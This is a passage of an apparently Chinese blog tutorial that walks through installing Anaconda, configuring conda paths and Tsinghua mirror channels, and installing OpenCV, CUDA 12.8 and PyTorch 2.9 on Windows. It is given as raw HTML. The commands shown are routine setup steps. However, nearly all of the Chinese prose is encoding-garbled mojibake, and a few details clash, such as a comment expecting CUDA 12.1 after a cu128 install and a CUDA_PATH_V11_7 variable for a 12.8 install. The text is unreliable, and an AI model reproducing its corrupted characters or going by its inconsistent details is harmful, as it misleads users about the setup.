target=\"_blank\">Anacondaå®‰è£…åŒ…ç½‘ç«™(æ¸…åŽå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ï¼ŒåŒ…å«å„ä¸ªç‰ˆæœ¬çš„Anaconda)</a></p>\n</blockquote>\n<p>ä¸‹è½½å®ŒæˆåŽï¼Œåªéœ€è¦ä¸€æ­¥ä¸€æ­¥æŒ‰ç…§æç¤ºå®‰è£…å³å¯ï¼Œä»¥ä¸‹è¯´æ˜Žå®‰è£…è¿‡ç¨‹ä¸­éœ€è¦ç‰¹åˆ«<strong>æ³¨æ„çš„æ­¥éª¤</strong></p>\n<p><strong>Step1:ç›´æŽ¥ç‚¹å‡»next</strong></p>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092316244-1948009572.png\" /></p>\n<p><strong>Step2:ç‚¹å‡» I Agree</strong></p>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092315866-443541853.png\" /></p>\n<p><strong>Step3:é€‰æ‹© ALL usersï¼ˆé€‰æ‹©ä»…ä¸ªäººçš„è¯ï¼ŒåŽé¢ä½¿ç”¨å¯èƒ½ä¼šæŠ¥é”™ï¼‰,ç„¶åŽç‚¹å‡»next</strong></p>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092315444-1902028308.png\" /></p>\n<p><strong>Step4:é€‰æ‹©anacondaçš„å®‰è£…ä½ç½®</strong></p>\n<blockquote>\n<p><strong>ðŸ””Tips: è¿™é‡Œå»ºè®®ä¿®æ”¹ä¸ºå…¶ä»–ç›˜,è¦ä¸ç„¶ä¸‹è½½çš„åŒ…å’Œåˆ›å»ºçš„çŽ¯å¢ƒéƒ½åœ¨Cç›˜ï¼Œå ç”¨ç©ºé—´ï¼Œæˆ‘è¿™é‡Œä¿®ä¸ºä¸ºFç›˜ï¼ˆä¸“é—¨å®‰è£…è½¯ä»¶çš„ç›˜ï¼‰ï¼ŒåŽé¢ä»‹ç»å¦‚ä½•æŠŠåˆ›å»ºçš„çŽ¯å¢ƒå’Œä¸‹è½½çš„åŒ…éƒ½è£…åœ¨è‡ªå·±æƒ³è£…çš„ç›˜é‡Œã€‚</strong></p>\n</blockquote>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092315090-1268213153.png\" /></p>\n<p><strong>Step5:è¿™é‡ŒæŠŠä¸‰ä¸ªå‹¾å…¨éƒ¨æ‰“ä¸Šï¼Œç„¶åŽç‚¹å‡»Install,anacondaå¼€å§‹å®‰è£…</strong></p>\n<blockquote>\n<ul>\n<li>ðŸ”’åˆ›å»ºå¼€å§‹èœå•</li>\n<li>ðŸ”’baseçŽ¯å¢ƒä»¥python3.12åˆ›å»º</li>\n<li>ðŸ”’æ¸…é™¤åŒ…ç¼“å­˜</li>\n</ul>\n</blockquote>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092314705-963703621.png\" /></p>\n<p><strong>Step6:å®‰è£…è¿›è¡Œä¸­ï¼Œç­‰å¾…å³å¯ï¼Œè¿™ä¸€æ­¥å–å†³äºŽç”µè„‘çš„æ€§èƒ½ã€‚</strong></p>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092313931-496847237.png\" /></p>\n<p><strong>Step6:</strong> ç‚¹å‡»ã€Nextã€‘â€”â€”å†æ¬¡ç‚¹å‡»ã€Nextã€‘</p>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092313411-477162055.png\" /></p>\n<p><strong>Step7ï¼šæŽ¥ç€æ¥åˆ°æœ€åŽä¸€æ­¥ï¼Œä¸¤ä¸ªå‹¾å–æ¶ˆï¼Œä¸è¦æ¡†é€‰ã€‚ç‚¹å‡»ã€Finishã€‘</strong></p>\n<blockquote>\n<p><strong>ðŸ“åˆ°è¿™é‡Œanacondaçš„å®‰è£…åŸºæœ¬å®Œæˆï¼ŒæŽ¥ä¸‹æ¥è¦å¯¹anacondaè¿›è¡Œä¸€äº›é…ç½®</strong></p>\n</blockquote>\n<p><img alt=\"img\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092312635-1795622181.png\" /></p>\n<h3 id=\"anacondaåŸºæœ¬é…ç½®\">AnacondaåŸºæœ¬é…ç½®</h3>\n<h4 id=\"1çŽ¯å¢ƒå˜é‡çš„é…ç½®\">1.çŽ¯å¢ƒå˜é‡çš„é…ç½®</h4>\n<p>ç”µè„‘è®¾ç½®æœç´¢æ æœç´¢é«˜çº§ç³»ç»Ÿè®¾ç½®</p>\n<p><img alt=\"image-20260115154750585\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092312212-1055610117.png\" /></p>\n<p>é€‰æ‹©çŽ¯å¢ƒå˜é‡</p>\n<p><img alt=\"image-20260115154908571\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092311630-1386658019.png\" /></p>\n<p>ç³»ç»Ÿå˜é‡é€‰æ‹©pathï¼ŒåŒå‡»è¿›å…¥</p>\n<p><img alt=\"image-20260115155010830\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092311185-1972202742.png\" /></p>\n<p>æ–°å»ºçŽ¯å¢ƒå˜é‡<strong>ã€æ ¹æ®è‡ªå·±å®‰è£…çš„ç›˜ï¼Œé€‰æ‹©å¯¹åº”çš„ç›˜ã€‘</strong></p>\n<pre><code>D:\\Workplace\\Anaconda\nD:\\Workplace\\Anaconda\\Scripts\nD:\\Workplace\\Anaconda\\Library\\bin\nD:\\Workplace\\Anaconda\\Library\\mingw-w64\\bin\n</code></pre>\n<p><img alt=\"image-20260115155343416\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092310755-211937717.png\" /></p>\n<p>åœ¨windowsèœå•æ æœç´¢Anaconda,ä»¥<strong><code>ç®¡ç†å‘˜èº«ä»½</code></strong>æ‰“å¼€anaconda prompt ï¼ˆæœ‰çš„ä¸ç”¨ä¼šå‡ºçŽ°é”™è¯¯ï¼Œæˆ‘å‘çŽ°æˆ‘çš„æ²¡æœ‰å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œåæ­£æ¯æ¬¡æ‰“å¼€anaconda promptéƒ½ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€å°±å¥½ï¼‰</p>\n<p><img alt=\"image-20260115155411649\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092310331-260155895.png\" /></p>\n<p>è¾“å…¥è¿™è¡Œä»£ç ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬å·ï¼Œæ£€æŸ¥æ˜¯å¦æˆåŠŸå®‰è£…</p>\n<pre><code class=\"language-shell\">conda --version\n</code></pre>\n<p><img alt=\"image-20260115155624509\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092309752-126832090.png\" /></p>\n<p>æˆåŠŸå®‰è£…ä¼šæ˜¾ç¤ºAnacondaçš„ç‰ˆæœ¬å·ï¼Œè¿™é‡Œanacondaå°±å®‰è£…å®Œæˆäº†ã€‚</p>\n<blockquote>\n<p>ä½†æ˜¯å¹¶æ²¡æœ‰ç»“æŸï¼Œå› ä¸ºè¿˜æ¶‰åŠåˆ°çŽ¯å¢ƒå’ŒåŒ…çš„ä¸‹è½½ï¼Œè¿™é‡Œé»˜è®¤æ˜¯ä¸‹è½½åœ¨Cç›˜çš„ï¼Œæˆ‘ä»¬éœ€è¦æ›´æ”¹ä¸‹è½½çš„ä½ç½®ï¼Œä»¥å…å Cç›˜ç³»ç»Ÿç›˜å†…å­˜ï¼›æœ€åŽå†æ·»åŠ é•œåƒæºæ–¹ä¾¿ä¸‹è½½çŽ¯å¢ƒçš„åŒ…ï¼ˆç½‘é€Ÿæ›´å¿«ï¼‰</p>\n</blockquote>\n<h4 id=\"2anacondaé»˜è®¤çŽ¯å¢ƒä¿å­˜è·¯å¾„å’Œä¸‹è½½æºä¿®æ”¹\">2.Anacondaé»˜è®¤çŽ¯å¢ƒä¿å­˜è·¯å¾„å’Œä¸‹è½½æºä¿®æ”¹</h4>\n<p>å› ä¸ºæ›´æ”¹çŽ¯å¢ƒä¿å­˜è·¯å¾„å’Œæ›´æ”¹ä¸‹è½½æºéƒ½å¯ä»¥åœ¨.condarcæ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œè¿™é‡Œä¸€æ¬¡æ€§é…ç½®å®Œï¼Œæ‰“å¼€ä¸Šé¢çš„anaconda promptå‘½ä»¤çª—å£ï¼Œè¾“å…¥<code>conda info</code>æŒ‡ä»¤</p>\n<p>æ²¡æœ‰ä¿®æ”¹çš„condaçš„pkgså’Œenvså‡ä¿å­˜åœ¨Cç›˜ï¼Œä¸ºäº†ä¸å ç”¨ç³»ç»Ÿç›˜çš„ç©ºé—´ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¿å­˜çš„ä½ç½®</p>\n<p><img alt=\"image-20260115155816471\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092309221-1042923198.png\" /></p>\n<p>åœ¨Cç›˜-ç”¨æˆ·-ç”¨æˆ·åï¼Œæ‰¾åˆ°.condarc,å¦‚æžœæ‰¾ä¸åˆ°æ‰“å¼€anaconda promptè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>\n<pre><code class=\"language-shell\">conda config --set show_channel_urls yes\n</code></pre>\n<p>å³å¯æ‰¾åˆ°ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€</p>\n<p><img alt=\"image-20260115155959605\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092308577-1082353410.png\" /></p>\n<blockquote>\n<p>å¦‚æžœæ²¡æœ‰çš„è¯è®°å¾—åœ¨èµ„æºç®¡ç†å™¨çš„æŸ¥çœ‹é‡Œé¢æŠŠéšè—çš„é¡¹ç›®æ‰“å¼€</p>\n</blockquote>\n<p><img alt=\"image-20260115160153060\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092307825-610112640.png\" /></p>\n<p>åˆ é™¤å…¶ä»–çš„ï¼Œè¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ã€æ³¨æ„ä¿®æ”¹ä¸ºè‡ªå·±æƒ³è¦å®‰è£…çš„ç›˜ï¼Œæˆ‘è¿™é‡Œä¿®æ”¹ä¸ºDç›˜ã€‘</p>\n<pre><code class=\"language-yaml\">envs_dirs:\n  - D:\\Workplace\\Anaconda\\envs\npkgs_dirs:\n  - D:\\Workplace\\Anaconda\\pkgs\n</code></pre>\n<p><code> ï¼ˆæ­¤å¤„æ›´æ–°ä¸åŠæ—¶ï¼Œéœ€è¦è‡ªå·±æ‰¾åˆ°æœ€æ–°å¯ç”¨çš„é•œåƒæºï¼‰</code>condaé•œåƒæºçš„é…ç½®ï¼Œå› ä¸ºcondaå¾ˆå¤šä¸‹è½½çš„ä¸œè¥¿åœ¨å›½å¤–ï¼Œé»˜è®¤çš„ä¸‹è½½é€Ÿåº¦å¾€å¾€ä¼šå¾ˆæ…¢ï¼Œè¿™é‡Œå»ºè®®ä¿®æ”¹ä¸ºæ¸…åŽçš„é•œåƒæºï¼Œä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€anaconda promptï¼Œè¾“å…¥ä»¥ä¸‹æŒ‡ä»¤</p>\n<pre><code class=\"language-yaml\">channels:\n  - defaults\nshow_channel_urls: true\ndefault_channels:\n  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main\n  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r\n  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2\ncustom_channels:\n  conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud\n  msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud\n  bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud\n  menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud\n  pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud\n  pytorch-lts: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud\n  simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud\n  \n  \n# ï¼ˆå¯é€‰ï¼‰è®¾ç½®æœç´¢æ—¶æ˜¾ç¤ºé€šé“åœ°å€\nconda config --set show_channel_urls yes\n</code></pre>\n<p>å¦‚æžœè¿™é‡Œè¯¯è£…äº†ä¸å¯ç”¨çš„é•œåƒæºå¯ä»¥è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤åˆ é™¤</p>\n<pre><code class=\"language-shell\">conda config --remove-key channels\n</code></pre>\n<p>æœ€åŽæˆ‘ä»¬éªŒè¯ä¸€ä¸‹ä¸Šé¢çš„å†…å®¹æ˜¯å¦æˆåŠŸé…ç½®</p>\n<pre><code class=\"language-yaml\">conda info\n</code></pre>\n<p>é¦–å…ˆpkgså’Œenvséƒ½ä¿®æ”¹ä¸ºFç›˜äº†</p>\n<p><img alt=\"image-20260115160908328\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092307286-1056253426.png\" /></p>\n<p>å…¶æ¬¡æˆ‘ä»¬çœ‹é•œåƒæºä¹ŸæˆåŠŸé…ç½®</p>\n<p><img alt=\"image-20260115161014579\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092306948-992006086.png\" /></p>\n<h3 id=\"pythonå’ŒopencvçŽ¯å¢ƒé…ç½®\">pythonå’ŒOpenCVçŽ¯å¢ƒé…ç½®</h3>\n<p>å®‰è£…å¥½AnacondaåŽï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªbaseçŽ¯å¢ƒï¼Œé‡Œé¢å†…ç½®äº†ä¸€äº›ç”¨äºŽç§‘å­¦è®¡ç®—çš„åŒ…ã€‚</p>\n<p>å¯ä»¥ä½¿ç”¨condaå‘½ä»¤æ¥åˆ›å»ºè™šæ‹ŸçŽ¯å¢ƒï¼ˆä¹Ÿå¯ä»¥åœ¨å›¾å½¢åŒ–ç•Œé¢ä¸­åˆ›å»ºï¼‰ï¼šæ‰“å¼€Anaconda Promptï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š</p>\n<pre><code class=\"language-shell\"># æŸ¥çœ‹å½“å‰æœ‰å‡ ä¸ªçŽ¯å¢ƒ\nconda env list\n\n# åˆ›å»ºä¸€ä¸ªæ–°çš„çŽ¯å¢ƒ å¯ä»¥æŒ‡å®špythonç‰ˆæœ¬ å¦‚æžœä¸æŒ‡å®šåˆ™å’Œbaseçš„pythonç‰ˆæœ¬ç›¸åŒ\nconda create -n python310 python==3.10\n# æŽ¥ä¸‹æ¥ä¼šä¸‹è½½ä¸€å †å¿…å¤‡çš„åº“\n\n# ä½¿ç”¨å‘½ä»¤æ¿€æ´»çŽ¯å¢ƒï¼ˆåˆ‡æ¢çŽ¯å¢ƒï¼‰\nconda activate python310\n\n# æŸ¥çœ‹å½“å‰çŽ¯å¢ƒæœ‰å“ªäº›åº“\nconda list\n\n# é€€å‡ºçŽ¯å¢ƒ\nconda deactivate\n</code></pre>\n<p><img alt=\"image-20260115172129122\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092306363-870823087.png\" /></p>\n<p>ä¹‹åŽè¾“å…¥</p>\n<pre><code class=\"language-shell\">conda install -c conda-forge opencv\n</code></pre>\n<p><code>-c conda-forge</code> è¡¨ç¤ºä»Ž <code>conda-forge</code> é¢‘é“å®‰è£… OpenCVï¼Œ<code>conda-forge</code> æ˜¯ä¸€ä¸ªç¤¾åŒºç»´æŠ¤çš„ Conda åŒ…ä»“åº“ï¼Œæä¾›äº†å¤§é‡çš„è½¯ä»¶åŒ…ã€‚</p>\n<p>condaä¼šæ™ºèƒ½çš„åˆ†æžä½ éœ€è¦çš„OpenCVç‰ˆæœ¬ä»¥åŠç›¸å…³è½¯ä»¶åŒ…ï¼Œä½†æ˜¯ä¸‹è½½é€Ÿåº¦ä¼šæ…¢ä¸€äº›</p>\n<p><img alt=\"image-20260115174837102\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092305769-217484928.png\" /></p>\n<h3 id=\"cuda128å®‰è£…\">CUDA12.8å®‰è£…</h3>\n<h4 id=\"1æ£€æŸ¥è®¾å¤‡æ˜¾å¡\">1.æ£€æŸ¥è®¾å¤‡æ˜¾å¡</h4>\n<p>æ­¤ç”µè„‘å³é”®-ç®¡ç†</p>\n<p><img alt=\"image-20260115161217323\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092305437-759191601.png\" /></p>\n<p>æŸ¥çœ‹æ˜¾å¡æ˜¯å¦æ˜¯è‹±ä¼Ÿè¾¾ï¼Œå¦‚æžœæ˜¯è‹±ä¼Ÿè¾¾ï¼Œåˆ™å¯ä»¥è¿›è¡Œå®‰è£…Cudaï¼Œå¦åˆ™ä¸èƒ½å®‰è£…Cudaã€‚</p>\n<p><img alt=\"image-20260115161337585\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092304962-1284474325.png\" /></p>\n<h4 id=\"2æŸ¥çœ‹nvidiaç‰ˆæœ¬\">2.æŸ¥çœ‹NVIDIAç‰ˆæœ¬</h4>\n<p>win+r è¿›å…¥è¿è¡Œï¼Œè¾“å…¥cmd</p>\n<p><img alt=\"image-20260115161719727\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092304579-63020192.png\" /></p>\n<p>åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>nvidia-smi</code>å¯ä»¥å½“å‰æ˜¾å¡é©±åŠ¨ç‰ˆæœ¬å’ŒCUDAç‰ˆæœ¬ã€‚</p>\n<p><img alt=\"image-20260115161959027\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092304257-1160077782.png\" /></p>\n<p>æ ¹æ®æ˜¾ç¤ºï¼Œç”µè„‘çš„æ˜¾å¡é…ç½®ä¸ºNVIDIA GeForce RTX 5060 Tiï¼Œæ˜¾å¡é©±åŠ¨ç‰ˆæœ¬ä¸ºï¼šDriver Version: 591.74ï¼ŒCUDA çš„ç‰ˆæœ¬ä¸ºï¼šCUDA Version 1301ã€‚å› æ­¤èƒ½å®‰è£…çš„Cudaé©±åŠ¨æœ€é«˜ç‰ˆæœ¬æ˜¯13.1ï¼Œå…¼å®¹13.1ä»¥ä¸‹ç‰ˆæœ¬ã€‚æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯12.8çš„ç¨³å®šç‰ˆæœ¬</p>\n<h4 id=\"3æ˜¾å¡gpuåŠå…¶ç›¸å…³æ¦‚å¿µ\">3.æ˜¾å¡GPUåŠå…¶ç›¸å…³æ¦‚å¿µ</h4>\n<p>æ˜¾å¡GPUï¼Œä¸»è¦ç”¨äºŽåœ¨å±å¹•ä¸Šæ˜¾ç¤ºå›¾åƒï¼Œç”¨äºŽä¸Žè§†é¢‘ã€å›¾åƒå¤„ç†ç›¸å…³çš„ä»»åŠ¡ã€‚</p>\n<p>æ˜¾å¡ï¼šå¯ä»¥åˆ†ä¸ºç‹¬ç«‹æ˜¾å¡å’Œæ ¸æ˜¾ï¼ˆåµŒå…¥åœ¨CPUä¸­ï¼‰</p>\n<p>é©±åŠ¨ï¼šç”¨äºŽè®©è®¡ç®—æœºè¯†åˆ«ç‰¹å®šçš„ç¡¬ä»¶</p>\n<p>æ·±åº¦å­¦ä¹ æ˜¾å¡ï¼šä¸€èˆ¬ç”¨è‹±ä¼Ÿè¾¾å“ç‰Œçš„æ˜¾å¡ï¼ŒNVIDIA</p>\n<p>CUDAï¼šè‹±ä¼Ÿè¾¾åŽ‚å•†åˆ›å»ºäº†ä¸€ä¸ªCUDAå¹³å°ï¼Œè®©æˆ‘ä»¬å¯ä»¥æ“ä½œè‹±ä¼Ÿè¾¾åŒ¹é…çš„æ˜¾å¡ï¼ŒPytorchçš„åº“ä¼šè°ƒç”¨CUDAçš„åº“åŽ»ç»™æ˜¾å¡å‘é€æŒ‡ä»¤å’Œæ•°æ®æ¥è¿›è¡Œæ·±åº¦å­¦ä¹ çš„è®­ç»ƒ</p>\n<p>å®ƒä»¬ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾ï¼šæˆ‘ä»¬çš„è®¡ç®—æœºå®‰è£…é©±åŠ¨ä¹‹åŽä¼šè¯†åˆ«åˆ°è¯¥æ˜¾å¡ï¼Œè‹±ä¼Ÿè¾¾æ˜¾å¡çš„é©±åŠ¨ä¼šè‡ªå¸¦ä¸€ä¸ªCuda driver versionï¼ˆCudaé©±åŠ¨ç‰ˆæœ¬ï¼‰æ˜¯è·Ÿé©±åŠ¨ç»‘å®šçš„ï¼Œæˆ‘ä»¬è¿˜ä¼šè£…ä¸€ä¸ªè½¯ä»¶å±‚é¢çš„Cuda runtime versionï¼Œå…¶ä¸­è¿è¡Œç‰ˆæœ¬è¦å°äºŽç­‰äºŽé©±åŠ¨ç‰ˆæœ¬ï¼ŒPytorchæƒ³è¦åˆ©ç”¨æ˜¾å¡å°±å¿…é¡»è¦è£…Cuda runtime versionï¼ŒCuda runtime versionå°±ä¼šæ“ä½œæ˜¾å¡æ¥å®Œæˆæ·±åº¦å­¦ä¹ çš„ä»»åŠ¡ã€‚</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092303953-1393718555.png\" /></p>\n<p>æˆ‘ä»¬ä¸»è¦å®‰è£…çš„Cudaæ˜¯è½¯ä»¶å±‚é¢çš„Cuda runtime version</p>\n<h4 id=\"4cudaçš„ä¸‹è½½ä¸Žå®‰è£…\">4.CUDAçš„ä¸‹è½½ä¸Žå®‰è£…</h4>\n<p>å®˜ç½‘ä¸‹è½½åœ°å€ï¼š<a href=\"https://developer.nvidia.com/cuda-toolkit-archive\" rel=\"noopener nofollow\" target=\"_blank\">CUDA Toolkit Archive | NVIDIA Developer</a></p>\n<p>æˆ‘é€‰æ‹©çš„æ˜¯12.8çš„ç‰ˆæœ¬</p>\n<p><img alt=\"image-20260115163057248\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092303378-305359950.png\" /></p>\n<p><img alt=\"image-20260115163305406\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092302495-1842618953.png\" /></p>\n<p>åŽé¢ä¸€è·¯å‚»ç“œå¼å®‰è£…ï¼Œ<strong><code>ä¸éœ€è¦é€‰æ‹©è‡ªå®šä¹‰</code></strong>ï¼Œç›´æŽ¥ç²¾ç®€å®‰è£…å°±å¯ä»¥</p>\n<h4 id=\"5æ£€æŸ¥ç³»ç»ŸçŽ¯å¢ƒå˜é‡\">5.æ£€æŸ¥ç³»ç»ŸçŽ¯å¢ƒå˜é‡</h4>\n<p>åœ¨è®¡ç®—æœºä¸Šç‚¹å³é”®ï¼Œæ‰“å¼€å±žæ€§-&gt;é«˜çº§ç³»ç»Ÿè®¾ç½®-&gt;çŽ¯å¢ƒå˜é‡ï¼Œå¯ä»¥çœ‹åˆ°å®‰è£…åŽï¼Œè‡ªåŠ¨é»˜è®¤åœ¨ç³»ç»Ÿä¸­é…ç½®å¥½ <a href=\"https://zhida.zhihu.com/search?content_id=253636505&amp;content_type=Article&amp;match_order=1&amp;q=CUDA_PATH&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3Njg2Mzc0NTcsInEiOiJDVURBX1BBVEgiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTM2MzY1MDUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.lcscqDlpa7JKnafMQRhEhynpvn9JJRubDQlwqQMZoYo&amp;zhida_source=entity\" rel=\"noopener nofollow\" target=\"_blank\">CUDA_PATH</a> å’Œ <a href=\"https://zhida.zhihu.com/search?content_id=253636505&amp;content_type=Article&amp;match_order=1&amp;q=CUDA_PATH_V11_7&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3Njg2Mzc0NTcsInEiOiJDVURBX1BBVEhfVjExXzciLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTM2MzY1MDUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.zWiIGvKhxqHs7TV1b8Ac_oAWPrOakgP7UAEzcEYB_c4&amp;zhida_source=entity\" rel=\"noopener nofollow\" target=\"_blank\">CUDA_PATH_V11_7</a> çŽ¯å¢ƒå˜é‡ï¼ˆ<strong>ç‰ˆæœ¬å·å¯¹åº”ç”¨æˆ·æ‰€ä¸‹è½½çš„ç‰ˆæœ¬å·</strong>ï¼‰ï¼š</p>\n<p><img alt=\"image-20260115164427354\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092301739-1330915170.png\" /></p>\n<p><img alt=\"image-20260115164547024\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092301217-1042451248.png\" /></p>\n<h4 id=\"6éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ\">6.éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸ</h4>\n<p>å®‰è£…å®Œæ¯•åœ¨å‘½ä»¤è¡Œè¾“å…¥ <strong>nvcc --version</strong>ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘å®‰è£…çš„æ˜¯12.8ã€‚è‡³æ­¤ï¼ŒCUDAçš„å®‰è£…è¿‡ç¨‹ç»“æŸã€‚</p>\n<p><img alt=\"image-20260115164637950\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092300440-1234683747.png\" /></p>\n<h3 id=\"pytorch29å®‰è£…\">PyTorch2.9å®‰è£…</h3>\n<p>æˆ‘ä»¬è¿›å…¥PyTorchå®˜ç½‘<a href=\"https://pytorch.org/get-started/locally/\" rel=\"noopener nofollow\" target=\"_blank\">Get Started</a>ï¼ŒæŒ‰ç…§è‡ªå·±çš„æƒ…å†µé€‰æ‹©ï¼Œå°±ä¼šèŽ·å¾—ä¸€ä¸ªpipå‘½ä»¤</p>\n<p><img alt=\"image-20260115175106490\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092259929-151002411.png\" /></p>\n<pre><code class=\"language-shell\">pip3 install torch torchvision --index-url https://download.pytorch.org/whl/cu128\n</code></pre>\n<p>å°†è¿™ä¸ªå‘½ä»¤ç›´æŽ¥åœ¨condaä¸­ä½¿ç”¨å³å¯</p>\n<h3 id=\"çŽ¯å¢ƒæµ‹è¯•\">çŽ¯å¢ƒæµ‹è¯•</h3>\n<p>å…¨éƒ¨å®‰è£…å¥½ä»¥åŽï¼Œæ‰“å¼€PyCharmï¼Œåœ¨å³ä¸‹è§’æ·»åŠ è§£é‡Šå™¨</p>\n<p><img alt=\"image-20260115175958011\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092259447-646448116.png\" /></p>\n<p>æˆ‘è¿™é‡Œæ˜¯å·²ç»é…ç½®å¥½äº†çš„ï¼Œå¦‚æžœæ²¡æœ‰é…ç½®è¿‡çš„è¯åº”è¯¥æ˜¯ç©ºçš„ï¼Œé€‰æ‹©æ·»åŠ è§£é‡Šå™¨-&gt;æ·»åŠ æœ¬åœ°è§£é‡Šå™¨</p>\n<p><img alt=\"image-20260115180053726\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092259099-2142818012.png\" /></p>\n<p>æŒ‰ç…§æˆ‘ä¸‹é¢è¿™ä¸ªå›¾ç¤ºè¿›è¡Œé€‰æ‹©ï¼Œä¹‹åŽç‚¹å‡»ç¡®å®šå³å¯</p>\n<p><img alt=\"image-20260115180126363\" src=\"https://img2024.cnblogs.com/blog/2448019/202601/2448019-20260116092258770-2128452803.png\" /></p>\n<p>æ­¤æ—¶æˆ‘ä»¬è¿è¡Œä¸‹åˆ—ä»£ç ï¼Œå¦‚æžœæ²¡æœ‰æŠ¥é”™å¹¶ä¸”èƒ½å¤Ÿæ­£å¸¸è¾“å‡ºä½ çš„ç›¸å…³çŽ¯å¢ƒç‰ˆæœ¬ï¼Œè¯´æ˜Žæ•´ä¸ªæœºå™¨å­¦ä¹ çš„çŽ¯å¢ƒå·²ç»å®‰è£…å®Œæ¯•ï¼</p>\n<pre><code class=\"language-python\">import torch\nimport cv2\n\n# éªŒè¯1ï¼šCUDAæ˜¯å¦å¯ç”¨ï¼ˆè¾“å‡ºTrueå³è¡¨ç¤ºé€‚é…æˆåŠŸï¼‰\nprint(\"CUDAæ˜¯å¦å¯ç”¨ï¼š\", torch.cuda.is_available())\n\n# éªŒè¯2ï¼šPyTorchç‰ˆæœ¬åŠé€‚é…çš„CUDAç‰ˆæœ¬ï¼ˆæ˜¾ç¤º12.1ï¼Œå®žé™…è°ƒç”¨æœ¬åœ°CUDA 12.8ï¼Œå±žæ­£å¸¸çŽ°è±¡ï¼‰\nprint(\"PyTorchç‰ˆæœ¬ï¼š\", torch.__version__)\nprint(\"PyTorché€‚é…çš„CUDAç‰ˆæœ¬ï¼š\", torch.version.cuda)\n\n# 